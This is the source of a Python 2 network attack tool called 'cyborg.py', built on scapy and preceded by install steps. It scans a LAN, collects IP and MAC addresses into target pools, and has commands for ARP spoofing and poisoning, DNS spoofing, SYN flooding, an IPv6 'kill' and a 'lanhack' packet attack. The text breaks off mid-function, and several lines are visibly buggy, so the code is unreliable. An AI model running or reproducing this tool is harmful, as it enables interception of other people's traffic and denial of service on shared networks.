#!/usr/bin/python
############################################
# HERE IS HOW TO INSTALL IN A UBUNTU 14.04 #
############################################
#
# 1) first download ubuntu at: http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.1-desktop-amd64.iso
#
# 2) then open the terminal and write the above line by line without the #
#
# sudo apt-get install -y gcc-multilib g++-multilib libffi-dev libffi6 libffi6-dbg python-crypto python-mox3 python-pil python-ply libssl-dev zlib1g-dev libbz2-dev libexpat1-dev libbluetooth-dev libgdbm-dev dpkg-dev quilt autotools-dev libreadline-dev libtinfo-dev libncursesw5-dev tk-dev blt-dev libssl-dev zlib1g-dev libbz2-dev libexpat1-dev libbluetooth-dev libsqlite3-dev libgpm2 mime-support netbase net-tools bzip2
# sudo apt-get install build-essential checkinstall
# sudo apt-get install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev
# cd ~/Downloads
# wget http://python.org/ftp/python/2.7.9/Python-2.7.9.tgz
# tar -xvf Python-2.7.9.tgz
# cd Python-2.7.9
# ./configure --prefix /usr/local/lib/python2.7.9 --enable-ipv6
# make
# sudo make install
# sudo checkinstall
# make clean
# sudo apt-get install python-dev
# sudo apt-get install python-setuptools
# sudo apt-get install python-pip //easy_install 
# sudo apt-get install gem
# sudo pip install -U pip setuptools
# sudo apt-get install python-networkmanager
# sudo pip install pyreadline
# sudo apt-get update && sudo apt-get upgrade
# sudo apt-get install gksu
# sudo apt-get INSTALL python-mysqldb
# sudo apt-get install build-essential python-dev libmysqlclient-dev libmariadbclient-dev
# sudo pip install scapy
#
# 3) upload the sniffer.cpp and compile using the terminal: "sudo gcc sniffer.cpp -o sniffer"
#
# 4) put the "cyborg.py" and "sniffer" in the same folder
#
# 5) start it with "sudo python cyborg.py"  even faster with "sudo nice -n 50 python cyborg.py"
#
import time, os, sys
import curses
import subprocess, threading
from multiprocessing import Process
import Queue
import uuid
import argparse
#import pymysql
import math, random, re, cmath
import urllib2, urllib
from datetime import datetime
import rlcompleter 
import atexit 
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import fcntl, select
from netaddr import *
#import netifaces
import shlex
import struct
import platform
import binascii
from StringIO import StringIO
#import ipaddr
#reload(sys)  
#sys.setdefaultencoding('utf8')

try:
  import readline
except ImportError:
  import pyreadline as readline
######################################################################################################################################
##################################################### [ CONFIG ] ####################################################################
#####################################################################################################################################
class configuration():
	ipmac = []
	ipmacbuff = []
	ip6macbuff = []
	ipnetwork = []
	noans = []
	ipmacclock = []
	rawscan = {
			'arpingstate': False,
			'rawscan': False,
			'rawlanhack': False,
			'rawarp': False,
			'rawpoison': False,
			'rawpool': -1,
			'arpspoofstate': False,
			'floodstate': False,
			'killstate':False,
			'dnsspoofstate': False
	}

	cyborg={"comtype":"file", 
			"comaccess":"com", 
			"comtype2":"socket",
			"comaccess2":"4269", 
			"cmd": "basic"
			}

	allprocess={"comtype":"file"}
	process = {
				'm1':{'name':'MultiCore1',  'type':'processor', 'func': 'multiprocess_core1', 	'sleep': 0.03, 'pos':0},
				'm2':{'name':'MultiCore2',  'type':'processor', 'func': 'multiprocess_core2', 	'sleep': 0.03, 'pos':0},
				'm3':{'name':'Multicore3',  'type':'processor', 'func': 'multiprocess_core3', 	'sleep': 0.03, 'pos':0},
				'fc':{'name':'SniffCore',   'type':'processor',	'func': 'sniff_core', 		 	'sleep': 0.05, 'pos':0},
				'sc':{'name':'ServiceCore1','type':'processor',	'func': 'service_core',			'sleep': 0.03, 'pos':0},
				'i6':{'name':'IPv6Core',    'type':'processor',	'func': 'ipv6_core', 			'sleep': 0.03, 'pos':0},
				'ss':{'name':'SniffSentry1','type':'processor',	'func': 'sniff_sentry', 		'sleep': 0.00, 'pos':0},
				'pc':{'name':'PacketCore',  'type':'processor',	'func': 'packet_core', 			'sleep': 0.01, 'pos':0}
			  }
	server=None
	name = []
	netspecs = None
	packets = []
	sleep = 0.001
	port = 0
	parts = len(process)
	uid = 0
	noise = 'quiet'
	hexa = False
	pthreads=0
	#stopped, loaded, started, fullstart
	status = 'STOPPED'
	myip = '127.0.0.1'
	myip6 = 'fe80::'
	oldip = '127.0.0.1'
	mymac = "ff:ff:ff:ff:ff:ff"
	localhost = socket.gethostbyname(socket.gethostname())
	localmac = '00:00:00:00:00:00'
	lstpacket = []
	snfpks = []
	snfrawpks = []
	ips = []
	nbpacket = 0
	sniffpkt = []
	current_os = platform.system()
	procedure = None
	comfm = None
	toread = ""
	message = {}
	datas = []
	MINE = None
	state = 'preloaded'
	def __init__(self):
		i = 0
		self.message = {}
		for k, v in self.process.iteritems():
			self.name.append(k)
			self.process[k]["pos"] = i
			self.message[k] = [None]
			i+=1
		self.message["mine"] = [None]	
		self.message["received"] = [None]
		self.message["broadcast"] = [None]
		self.MINE = i+2
		if len(sys.argv)>1 and os.path.isfile(sys.param[1]):
			self.procedure = sys.argv[1]
	def reclock(self,ip,mac):
		if config.ipmacclock == []: return time.time()
		else:
			for i in range(len(config.ipmacclock)):
				if config.ipmacclock[i][0] == ip and config.ipmacclock[i][1] == mac:
					return config.ipmacclock[i][2]
			return time.time()	
	def insert_ipmac(self, ipmac, kind='IPv4'):
			if kind == 'IPv4' and not in2d(ipmac[0], self.ipmac): 
				self.ipmac.append(ipmac)
				#if ipmac[0] in IPNetwork(self.netspecs.get_network()+self.netspecs.get_mask_range()):
				#	self.ipnetwork.remove(ipmac[0])
				return True
			elif kind == 'IPv6' and not in2d(ipmac[3],self.ipmac,3):
				self.ipmac.append(ipmac)
				return True
			else: return False
	def insert_msg(self, name, msg):
		self.message[name].append(msg)
	def remove_ipmac(self, ipmac):
		for i in range(len(self.ipmac)):
			if (self.ipmac[i][0] !='' and self.ipmac[i][0] == ipmac[0]) or self.ipmac[i][3] == ipmac[3]:
				self.ipmac.pop(i)
				break
		
def port_finder():
	portno = 6600
	sock = None
	while sock == None:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind((config.localhost, portno))
			sock.listen(10)
			sock.close()
			return portno
		except:
			sock = None
			portno += 1
			pass

config = configuration()
config.port = port_finder()
######################################################################################################################################
######################################################## [ MAIN ] ####################################################################
######################################################################################################################################

#sys.excepthook = lambda *args: None
try:
	# tab completion 
	readline.parse_and_bind('tab: complete') 
	# history file 
	histfile = os.path.join(os.environ['HOME'], '.pythonhistory') 
	readline.read_history_file(histfile) 
	atexit.register(readline.write_history_file, histfile) 
	del os, histfile, readline, rlcompleter
except IOError: 
    pass 

def main(argv):
	global sniff, sevent, config
	try:
		Cyborg=[]
		state='none'
		read=""
		global config
		print("'help' to get help menu")
		print("'exemple 1 to exemple 4' for the exemples")
		while config.toread != "quit" or state not in ('none','stopped','loaded','started'):
			read = raw_input("")
			config.toread = read.lower()
			if config.toread == "status": print '\nCyborg state '+state+'\n'
			elif config.toread == "":writeToCyborg("enter")
			elif config.toread == "stop":
				if state == 'started': 
					state = 'stopped'
					if config.noise != 'silent': print(colours.red+"gonna shut down"+colours.default)
					event.set()
					[c.join() for c in Cyborg]
					Cyborg = []
				elif state == 'stopped': print("Already stopped")
			elif config.toread == "talk": config.noise = "talk"
			elif config.toread == "quiet": config.noise = "quiet"
			elif config.toread == "silent": config.noise = "silent"
			elif config.toread == "file": 
				config.allprocess["comtype"]="file"
			elif config.toread == "tunel": 
				config.allprocess["comtype"]="tunel"
			elif config.toread == "config":
				print "\n#####[ PROGRAM CONFIGURATION ]#####\n"
				print 'national UID:\t' + str(config.uid)
				print 'program config.noise:\t' + str(config.config.noise)
				print 'program status:\t' + str(config.status)
				print 'spoofed MAC:\t' + colours.blue+config.mymac+colours.default
				print 'spoofed IP:\t' + colours.blue+config.myip+colours.default 
				print 'packet verbose:\t' + str(conf.verb)
				print 'hexa status:\t' + str(config.hexa)
				print("")
			elif config.toread == "enum": print(threading.enumerate())
			elif config.toread == "count": print "there is",threading.activeCount(),"threads"
			elif config.toread == "mac": print config.mymac
			elif config.toread == "hexa":
				if config.hexa == False: 
					print "/00 hexadecimal mode activated /00"
					config.hexa = True
				else: 
					print "/00 hexadecimal mode desactivated /00"
					config.hexa = False
			elif config.toread == "load":
				if state == 'none' or state == 'stopped':
					state='loaded'
					config.status = "LOADED"
					event = threading.Event()
					plan = -1
					Cyborg.append(cyborg(event, 1))
				elif state == 'started': print("Already started yet !")
			elif config.toread == 'start':
				if state == 'none' or state == 'stopped':
					config.parts = len(config.process)
					state='loaded'
					config.status = "LOADED"
					event = threading.Event()
					plan = -1
					Cyborg.append(cyborg(event, 1))
				elif state == 'stated':
					print("Already stated yet")
				if state=='loaded':
					state='started'
					config.status = "STARTED"
					[c.start() for c in Cyborg]
				elif state=='none': print("need to 'load' first")
			elif 'exemple 1' in config.toread: print Exemple[0]
			elif 'exemple 2' in config.toread: print Exemple[1]
			elif 'exemple 3' in config.toread: print Exemple[2]
			elif 'exemple 4' in config.toread: print Exemple[3]
			elif 'verbose=' in config.toread:
				i = config.toread[config.toread.index("=")+1:]
				if i.isdigit() and int(i) in (0,1,2):
					conf.verb=int(i)
					print "packet verbose set to "+i
			elif '--help' in config.toread:
				cmd = config.toread[0:config.toread.index('--help')-1]
				if findindex(cmd) != -1:
					print("\nHelp for the command ["+cmd+"]")
					print(commands[findindex(cmd)][1]+'\n')
			elif config.toread == 'help':
				print "###### main commands ######"
				for i in range(5):
					print('['+commands[i][0]+']')
				print "you need to 'load' then 'start' the cyborg first"
				print "###### config commands ######"
				for i in range(5,13):
					print('[c)'+commands[i][0]+']')
				print "###### network commands ######"
				for i in range(13,len(commands)):
					print('[c)'+commands[i][0]+']')
				print("Write cmd --help to get specific command help")
			elif config.toread[0:2] == "f)": call_func(read[2:])
			elif config.toread[0:2] == "c)":
				if state=='started':
					f = open(config.cyborg['comaccess']+'.core.bota', 'w')
					f.write(read[2:])
					f.close()
				else: 
					print("need to start the cyborg")
			if config.toread != 'quit':config.toread = 'enter'
	except KeyboardInterrupt:
		print("You pressed ctrl-c")
	finally:
		if state == 'started': 
			config.state = 'stopped'
			state == 'stopped'
			if config.noise != 'silent': print(colours.red+"gonna shut down"+colours.default)
			event.set()
			[c.join() for c in Cyborg]
			Cyborg = []


######################################################################################################################################
##################################################### [ NETWORK ] ####################################################################
#####################################################################################################################################

class net_specs():
	host={"8":16777216,"9":8388608,"10":4194304, "11":2097152, "12":1048576,\
		 "13":524288, "14":262144,"15":131072,  "16":65536,   "17":32768,\
		 "18":16384,  "19":8192,  "20":4096,    "21":2048,    "22":1024, "23":512,\
		 "24":256,    "25":128,   "26":64,      "27":32,      "28":16,   "29":8,  "30":4, "31":2, "32":1}
	maskrangelst = {
		'255.0.0.0': '/8',
		'255.128.0.0': '/9',
		'255.192.0.0': '/10',
		'255.224.0.0': '/11',
		'255.240.0.0': '/12',
		'255.248.0.0': '/13',
		'255.252.0.0': '/14',
		'255.254.0.0': '/15',
		'255.255.0.0': '/16',
		'255.255.128.0': '/17',
		'255.255.192.0': '/18',
		'255.255.224.0': '/19',
		'255.255.240.0': '/20',
		'255.255.248.0': '/21',
		'255.255.252.0': '/22',
		'255.255.254.0': '/23',
		'255.255.255.0': '/24',
		'255.255.255.128': '/25',
		'255.255.255.192': '/26',
		'255.255.255.224': '/27',
		'255.255.255.240': '/28',
		'255.255.255.248': '/29',
		'255.255.255.252': '/30',
		'255.255.255.254': '/31',
		'255.255.255.255': '/32'
		}
	def __init__(self): 
		self.default_values()	
	def default_values(self):
		self.loaded=False
		self.loading=False
		self.externip = config.localhost
	  	self.lanip = config.localhost
		self.lanip6 = 'fe80::'
		self.gateway = config.localhost
		self.gatewaymac = config.localmac
		self.baseip = config.localhost
		self.mask = '255.255.255.255'
		self.broadcast = config.localhost
		self.mac = config.localmac
		self.interface = 'iface0'
		self.network = config.localhost
		self.maskrange = '/32'
		self.loadingstate = 0
	def start(self):
		global config
		self.default_values()
		self.loading = True
		self.loaded = False
		if config.noise != 'silent': print(colours.on_magenta+"Configuring network specs"+colours.default)
		config.myip = self.get_lan_ip()
		config.oldip = config.myip
		if not self.lanip == config.localhost:
			self.get_iface()
			self.get_lan_ipv6()
			#self.get_external_ip()
			config.mymac = self.get_mac()
			self.get_mask()
			self.get_mask_range()
			self.get_network()
			self.get_gateway()
			self.get_gateway_mac()
			self.get_broadcast(self.lanip, self.mask)
		if config.noise != 'silent': print(colours.on_magenta+"Network configuration charged"+colours.default)
		if self.lanip == config.localhost: print(colours.red+"You are currently offline"+colours.default)
		else: print(colours.supgreen+"Connected on network "+self.externip+colours.default)
		self.loaded = True
	def lprint(self,msg):
		if config.noise != 'silent' and self.loading == True: 
			self.loadingstate += 10 
			print str(round(self.loadingstate,2))+'% '+ msg
	def get_last_ip(self): 
		return convert.int2ip(convert.ip2int(self.network) + self.get_nb_hosts())
	def get_status(self): return self.loaded
	def get_loading_state(self): return self.loadingstate
	def get_network(self):
		network = self.network
		if network == config.localhost and self.loaded == False:
			self.lprint("getting network")
			gtw = str(IPNetwork(self.lanip+self.maskrange).network)
			network = ".".join(gtw.split('.')[0:-1]) + ".0"
			self.network = network
		return network
	def get_external_ip(self):
    		#fqn = os.uname()[1]
		ext_ip = self.externip
		if ext_ip == config.localhost and self.loaded == False:
			self.lprint("getting external IP")
			try: ext_ip = urllib2.urlopen("http://myip.dnsdynamic.org/").read()
			except KeyboardInterrupt:pass
			except: pass
			#get ip in case there is dump
			srch = re.search(r'([0-9]{1,3}.){3}[0-9]{1,3}',ext_ip)
			if srch != None:
				ext_ip = srch.group()
			else: ext_ip = config.localhost
			self.externip = ext_ip
		return ext_ip
	def get_interface_ip(self,ifname):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		ifaceip = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s',ifname[:15]))[20:24])
		return ifaceip
	def get_lan_ip(self, xcall=False):
		global config
		lanip = self.lanip
		if (lanip == config.localhost and self.loaded == False) or xcall==True:
			if xcall == False:
				self.lprint("getting lan ip/ip6")
			else: lanip = config.localhost
			if lanip.startswith("127.") and os.name != "nt":
				interfaces = ["eth0","eth1","eth2","wlan0","wlan1","wifi0","ath0","ath1","ppp0"]
				for ifname in interfaces:
					try:
						lanip = self.get_interface_ip(ifname)
						break
					except IOError:
						pass
			else: print("file doesnt exists on path ")
			self.lanip = lanip
		return lanip
	def get_nb_hosts(self): 
		return self.host[str(self.get_mask_range()[1:])]
	def get_nb_hosts_mask(self, mask):
		if mask == "": return "/32"
		else: return self.host[mask[1:]]
	def get_iface(self):
		iname = self.interface
		ip = config.localhost
		if iname == 'iface0' and self.loaded == False:
			self.lprint("getting interface")			
			if ip.startswith("127.") and os.name != "nt":
				interfaces = ["eth0","eth1","eth2","wlan0","wlan1","wifi0","ath0","ath1","ppp0"]
				for ifname in interfaces:
					try:
						ip = self.get_interface_ip(ifname)
						iname = ifname
						if ip != config.localhost: 
							self.interface = iname
							break
					except IOError: pass
			else: print("file doesnt exists on path \'" + pathhck + "\'")
		return iname
	def get_default_gateway_linux(self):
	   	with open("/proc/net/route") as fh:
			for line in fh:
			    fields = line.strip().split()
			    if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
		return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
	def get_gateway_mac(self):
		gtwmac = self.gatewaymac
		if gtwmac == config.localmac and self.loaded == False:
			self.lprint("getting gateway mac")
			try:
				ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.gateway),timeout=2)
				for snd,rcv in ans: gtwmac = rcv.src
			except: pass
			self.gatewaymac = gtwmac
		return gtwmac
	def get_gateway(self): 
		gateway = self.gateway
		if gateway == config.localhost and self.loaded == False: 
			self.lprint("getting gateway ip") 
			gateway = ".".join(self.network.split('.')[0:-1]) + ".1"
			self.gateway = gateway
		return gateway
	def get_mask_range(self): 
		maskrange = self.maskrange
		if maskrange == '/32':
			self.lprint("getting mask range") 
			self.maskrange = self.maskrangelst[self.mask]
		return maskrange
	def get_mask(self): 
		mask = self.mask
		if mask == '255.255.255.255' and self.loaded == False:
			self.lprint("getting mask")
			mask = socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_DGRAM),\
			       35099, struct.pack('256s', self.interface))[20:24])
			self.mask = mask
		return mask
	def get_broadcast(self, ip=None, netmask=None):
		broadcast = self.broadcast
		if broadcast == config.localhost and self.loaded == False:
			self.lprint("getting broadcast")
			if not ip or not netmask: return ""
			ip = ip.split('.')
			netmask = netmask.split('.')
			for n in range(0,4):
				if netmask[n] == '0': break
				bc = (map(lambda a, b: str(int(a, 10)&int(b,10)), ip[0:n]+['255']*(4-n), netmask[0:n]+['255']*(4-n)))
				if n > 1: bc[n-1] = str(int(bc[n-1]) + (255 - int(netmask[n-1])))
			broadcast = '.'.join(bc)
			self.broadcast = broadcast
		return broadcast
 	def get_mac(self): 
		mac = self.mac
		if mac == config.localmac and self.loaded == False: 
			mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
			self.lprint("getting current system mac address")
			self.mac = mac
		return mac
	def get_lan_ipv6(self):
		lanip6 = self.lanip6
		#if lanip6 == 'fe80::' and self.loaded == False:
		#	lanip6 = netifaces.ifaddresses(self.interface)[netifaces.AF_INET6][0]['addr']
		#	lanip6 = lanip6[0:lanip6.find('%')]
		self.lanip6 = lanip6
		#return lanip6
	def tostr(self):
		if self.loaded == False: self.start()
		print("\n###[ NETWORK LAN CONFIGURATION ]###\n")
		if not self.lanip == config.localhost:
			if int(self.get_mask_range()[1:]) >= 24: print("This is a subnet Class C")
			elif int(self.get_mask_range()[1:]) >= 16: print("This is a subnet Class B")
			else: print("This is a subnet Class A")
			print("eixternip:\t" +colours.green+self.externip+colours.default)
			print("network\t\t" + self.network+self.maskrange)
			print("gateway:\t" + self.gateway)
			print("gtwmac:\t\t" + self.gatewaymac)
		print("localip:\t" +colours.blue+self.lanip+colours.default)
		if not self.lanip == config.localhost:
			print("mac:\t\t"+colours.blue+self.mac+colours.default)
			print("mask:\t\t" + self.mask)
			print("broadcast\t" + self.broadcast)			
			print("interface\t" + self.interface)
			print("There is a possibility of "+ str(self.get_nb_hosts()) + " hosts on this network")
		else: print("You are currently offline")
		print("")

class scanports(threading.Thread):
	ports = [20,21,22,23,80,53,137,138,139,443,1023,8080]
    	def __init__(self,ip):
		threading.Thread.__init__(self)
		remoteServer = ip
		self.remoteServerIP  = socket.gethostbyname(remoteServer)
		self.socks = []
		self.threads = []
	def run(self):
		print("Please wait, scanning remote host", self.remoteServerIP)
		for port in self.ports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.socks.append(sock)
			t = threading.Thread(target=scanip, args = (port,self.remoteServerIP,sock))
			self.threads.append(t)
			t.start()
		[t.join() for t in self.threads]
		print('Scanning completed on', self.remoteServerIP)

def scanip(portno,rs,sock):
	print 'scanning port:', portno
	try:
		result = sock.connect_ex((rs, portno))
		sock.connect()
		if result == 0: msg+="success"
		print(msg);
		sock.close()
	except KeyboardInterrupt:
		print("You pressed Ctrl+C")
		sys.exit()
	except socket.gaierror:
		print('Hostname could not be resolved. Exiting')
		sys.exit()
	except socket.error:
		print("Couldn't connect to server")
		sys.exit()
	except:
		pass


######################################################################################################################################
##################################################### [ CYBORG ] ####################################################################
#####################################################################################################################################

#scapy config
conf.verb = 0
conf.checkIPaddr = False
conf.checkIPsrc = False


########################[ ENUMERATION/ DEFINITION/ CONSTANTS/DATABASE]#########################

CIP = 0
CMAC = 1

SN = 0
AK = 1
UP = 2
FW = 3
#silent/quiet/talk


########################[ CORE CYBORG ]#########################
import os
class cyborg(threading.Thread):
	state = 'none'
	def __init__(self,e,plan=1):
		threading.Thread.__init__(self)
		if config.noise != 'silent': print colours.on_magenta+"Cyborg loaded in memory"+colours.default
		self.event = e
		self.name = "cyborg"
		self.state = 'loaded'
		self.processors = processors()
		self.parts = parts(plan)
		self.communicate = communicate()
		self.comtype = config.allprocess["comtype"]
		self.comfm = comFileManager(kind=self.comtype)
		self.sleep = config.sleep
		self.ports=[]
		self.ipmacsel = []
		self.ipmacunsel = []
		self.ipmacpool = [[] for x in range(10)]
		self.nbconnected = 0
		self.tot_pourcent = 0
		self.lanscancount=[0,0]
		self.sorted = None
		self.netstart = None
		self.mask = '/24'
		self.threads = []
		self.evnt = threading.Event()
		self.events = []
		self.server_core = run()
	def run(self):
		global config	
		self.preprocess()		
		self.server_core.start()
		while config.netspecs.get_status() != True and self.event.isSet():time.sleep(config.sleep)
		if config.noise != 'silent': print(colours.on_magenta+"Cyborg started"+colours.default)
		#cyborg can execute task
		self.processors.configure_processor()
		self.processors.startall()
		self.parts.start()
		t = threading.Thread(target=murgeip4_6, args=(self.event,))
		self.threads.append(t)
		t.start()
		#MAIN OF THE CYBORG
		while not self.event.isSet():
			self.answer(self.communicate.listen())
			self.ansserv(config.datas)
			if config.allprocess["comtype"] != self.comtype:
				self.comtype = config.allprocess["comtype"]
				self.comfm = comFileManager(kind=self.comtype)
			#if self.conn != None: self.dbcommands()
			if self.state == 'loaded': self.state = 'started'
			time.sleep(config.sleep)
		self.evnt.set()
		self.defaultval()
		config.message["mine"].insert(0, "stop")
		self.parts.stop()
		self.processors.stopall()
		stopped = False		
		[e.set() for e in self.events]
		while stopped == False:
			for state in self.processors.getstatus():
				if state == 'started':
					stopped = False
					break
				elif state == 'stopped':
					stopped = True
			time.sleep(config.sleep)
		if config.noise != 'silent': print(colours.on_magenta+"Cyborg stopped"+colours.default)
	############## [ DATABASE ] ##################
	def defaultval(self):
		global config
		config.pthreads=0
		#stopped, loaded, started, fullstart
		config.status = 'STOPPED'
		config.parts = 0
		self.netstart.cancel()
	def preprocess(self):
		global config, tunel
		if config.state == 'stopped':
			config = configuration()
			config.state = "preloaded"
		config.netspecs = net_specs()
		config.ipnetwork = [ip for ip in IPNetwork(config.netspecs.get_network()+config.netspecs.get_mask_range())]
		self.netstart = threading.Timer(3.0, self.nettest)
		self.netstart.start()
		tunel = Tunel()
		tunel.create('tunel1')
		config.server = tunel.get_server('tunel1')
		print "Tunel ready on port ["+str(config.server.get_port())+"] "
		print colours.lightblue + "Data encryption: High" + colours.default
		netstart(True)
	def dbcommands(self):
		commands = None
		#readdbcommands	
	def readlist(self,name="list.bota"):
		if os.path.isfile(name):
			f = open(name, 'rw')
			lines =	f.readlines()
			for line in lines:
				self.answer(line)			
			f.close()
			os.remove(name)
	def showIPs(self, param):
		lst = []
		if config.ipmac != None:
			if self.sorted != None: self.sort([self.sorted])
			if param == []:
				lst6 = []
				lst = []
				for i in range(0, len(config.ipmac)): 
					ip = config.ipmac[i][0]
					ip6 = config.ipmac[i][3]
					if ip != '':
						if ip == config.netspecs.get_gateway(): ip = colours.magenta + ip + colours.default
						elif ip not in IPNetwork(config.netspecs.get_network() + config.netspecs.get_mask_range()):
							ip = colours.darkgrey + ip + colours.default
						lst.append(ip)
					else: lst6.append(colours.lightgrey+ip6[:findindx(ip6,':')+2]+':'+ip6[findindx(ip6,':',6)+2:]+colours.default)
				lst.extend(lst6)
				pretty_print(lst,True)
				print("count "+ str(len(config.ipmac)))
			elif param[0] == '-c':
				tmr = time.time()
				lst6 = []
				lst = []
				for i in range(0, len(config.ipmac)):
					ip = config.ipmac[i][0] 
					ip6 = config.ipmac[i][3]
					m, s = divmod(tmr-config.ipmac[i][2], 60)
					toprint = "%02d:%02d" % (m,s)
					if ip != '':
						if ip not in IPNetwork(config.netspecs.get_network() + config.netspecs.get_mask_range()):
							ip = colours.darkgrey+config.s+colours.default
						lst.append(ip +' | '+toprint)
					else: lst6.append(colours.lightgrey+ip6[:findindx(ip6,':')+2]+':'+ip6[findindx(ip6,':',6)+2:]+colours.default)
				lst.extend(lst6)
				pretty_print(lst,True)
				print("count "+ str(len(config.ipmac)))
	def showSelIPs(self):
		lst=[]
		if self.ipmacsel != None:
			x, y = get_terminal_size()
			for i in range(len(self.ipmacsel)):
				lst.append('ip: ' + self.ipmacsel[i][0] + ' | mac: ' + self.ipmacsel[i][1])
			pretty_print(lst,True)
			print("count "+ str(len(self.ipmacsel)))
		else: print("select list is empty")
	def packet(self,param):
		if param != []:
			if param[0] == 'send':
				self.comfm.append('pc', "pcsend")
			elif param[0] == 'conf' and len(param) > 1 and param[1].isdigit() and int(param[1]) in range (10000):
				self.comfm.append('pc', "pcconfig", param[1])
	def showstatus(self):
		print("\n### [ STATUS OF ATTACKS ]###\n")
		print("arping\t\t" + str(config.rawscan['arpingstate']))
		print("rawscan\t\t" + str(config.rawscan['rawscan']))
		print("rawlanhack\t" + str(config.rawscan['rawlanhack']))
		print("rawarp\t\t" + str(config.rawscan['rawarp']))
		print("rawpoison\t" + str(config.rawscan['rawpoison']))
		print("arpspoof\t" + str(config.rawscan['arpspoofstate']))
		print("flood\t\t" + str(config.rawscan['floodstate']))
		print("kill\t\t" + str(config.rawscan['killstate']))
		print("dnsspoof\t"+ str(config.rawscan['dnsspoofstate']))
		print("rawpool\t\t"+str(config.rawscan['rawpool']))
		print("")
	def pool(self,param):
		if param != []:
			x, y = get_terminal_size()
			if param[0]=='sel2' and len(param)>1 and param[1].isdigit() and int(param[1]) in range(10): 
				print "added "+str(len(self.ipmacsel))+" elements of your selection to pool "+param[1]
				self.ipmacpool[int(param[1])] = self.ipmacsel
			elif param[0]=='show' and len(param)>1 and param[1].isdigit() and int(param[1]) in range(10) \
			  and self.ipmacpool[int(param[1])] != []: 
				enums = []
				poolno = int(param[1])
				string = "[ POOL "+param[1]+" ]"
				center_print(surround_print(string,'*',padding=6,side=2))
				pool = self.ipmacpool[poolno]
				for i in range(len(pool)):
					enums.append(pool[i][0])
				pretty_print(enums,True)
				print("count "+ str(len(pool)))
			elif param[0]=='show' and len(param)>1 and param[1]=='*':
				for i in range(10):
					enums = []
					poolno = i
					pool = self.ipmacpool[poolno]
					if len(pool) > 0:
						string = "[ POOL "+str(poolno)+" ]"
						center_print(surround_print(string,'*',padding=6,side=2))
						for i in range(len(pool)): 
							enums.append(pool[i][0])
						pretty_print(enums,True)
						print("count "+ str(len(pool)))
			elif param[0]=='clear' and len(param)>1:
				if param[1].isdigit() and int(param[1]) in range(10):
					self.ipmacpool[int(param[1])] = []
					print "cleared pool "+param[1]
				elif pram[1] == '*':
					for i in range(len(self.ipmacpool)):
						self.ipmacpool[i] = []
					print "cleared all the pools"
			elif param[0] == 'arp' and len(param) > 1:
				ips = []
				macs = []
				if param[1].isdigit() and int(param[1]) in range(10):
					pool = self.ipmacpool[int(param[1])]
					if pool != []:
						for i in range(len(pool)):						
							ips.append(pool[i][0])
							macs.append(pool[i][1])
						self.comfm.append('sc', "scnew", ips, macs)
						print("added "+str(len(ips))+" ips to arppool")
					else: print("this pool is empty")
				elif param[1] == '*':
					for i in range(len(config.ipmac)):
						ips.append(config.ipmac[i][0])
						macs.append(config.ipmac[i][1])
					self.comfm.append('sc', "scnew", ips, macs)
					print("added "+str(len(ips))+" ips to arppool")
	def arpspoof(self,param):
		ips=[]
		macs=[]
		if param is not None: 
			if param[0] == 'start': 
				self.comfm.append('sc', 'scarpspoof')
				print(colours.green+"starting arpspoof "+colours.default)
				self.arpspoofstate = True
			elif param[0] == 'stop':
				self.comfm.append('sc', 'scarpspoofrmv')
				self.arpspoofstate = False
				print("Stopped arpspoof")
			elif param[0] == 'clear':
				self.comfm.append('sc', 'scarpspoofclr')
				print("removed all the ips/macs in arpspoof")
	def arppoison(self,param):self.comfm.append('sc', 'scarppoison')
	def arping(self,param): self.comfm.append('m2','m2scan ' + ' '.join(param))
	def lanscan(self,param):
		if param != [] and param[0] == 'meter': 
				print colours.on_blue+"scanned "+str(self.lanscancount[0])+\
				' / '+str(self.lanscancount[1]) + ' clients'+colours.default
		elif param !=[] and param[0] in ('-f','-n') and len(param)>1:
			print "starting scanning"
			ips = []
			if param[0] == '-f': mode = 'm3fast'
			elif param[0] == '-n': mode = 'm3new'
			if param[1].isdigit() and int(param[1]) in range(10):
				pool = self.ipmacpool[int(param[1])]
				for i in range(len(pool)):						
					ips.append(pool[i][0]+' '+pool[i][1])
			elif param[1] == '*':
				for i in range(len(config.ipmac)):
					ips.append(config.ipmac[i][0]+' '+config.ipmac[i][1])
			self.lanscancount[0] = 0
			self.lanscancount[1] = len(ips)
			self.comfm.append('m3', mode, ips)
			if mode == 'm3fast': 
				print "scan on", str(len(ips)), "machine\nit gonna take",str(len(ips)),"secondes"
			else: 
				print "scan on", str(len(ips)), "machine\nit gonna take",str(round(25*len(ips)/60,2)),"minutes"
			self.comfm.append('m3', 'm3scan')
	def lanhack(self,param):
		ips=[]
		if param is not None: 
			if param[0].isdigit() and int(param[0]) in range(10) and self.ipmacpool[int(param[0])] != []:
				pool = self.ipmacpool[int(param[0])]
				for i in range(len(pool)):						
					ips.append(pool[i][0]+' '+pool[i][1])
				self.comfm.append('m1', "m1new", ips)
				print("Starting hack packets on "+str(len(ips)) +" devices")
			elif param[0]=='*':
				for i in range(len(config.ipmac)):
					ips.append(config.ipmac[i][0]+' '+config.ipmac[i][1])
				self.comfm.append('m1', "m1new", ips)
				print("Starting hack packets on "+str(len(ips)) +" devices")
	def kill(self,param):
		if param != []:
			if param[0] == 'stop': 
				self.comfm.append('i6', "i6stopkill")
				self.killstate = False
			elif param[0] == 'start': 
				self.comfm.append('i6', "i6kill")
				self.killstate = True
	def flood(self,param):
		if param != []:
			if param[0] == 'stop': 
				self.comfm.append('m1', "m1sfstop")
				self.floodstate = False
			if param[0]=='start':
				self.comfm.append('m1', "m1syncflood")
				self.floodstate = True
		else: 
